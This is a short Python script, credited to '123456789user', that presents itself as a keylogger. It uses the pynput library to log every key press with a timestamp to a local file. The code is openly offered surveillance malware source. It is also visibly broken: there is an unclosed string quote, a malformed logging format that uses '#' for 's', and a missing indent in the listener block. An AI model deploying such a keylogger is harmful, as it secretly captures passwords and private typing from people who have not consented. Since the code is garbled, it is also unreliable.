#The keylogger made by 123456789user

from pynput.keyboard import Key, Listener
import logging

#if no name it gets put into an empty string
log_dir = ""

#This is the basic logging function
logging.basicConfig(filename=(log_dir + "key_log.txt), level=logging.DEBUG, format='%(asctime)#: %(message)#')

#This is from the library
def on_press(key):
    logging.info(key)
    #if key == Key.esc:
    # Stop the listener
    #return False

#This says, the listener is on 
with Listener(on_press=on_press) as listener:
listener.join()
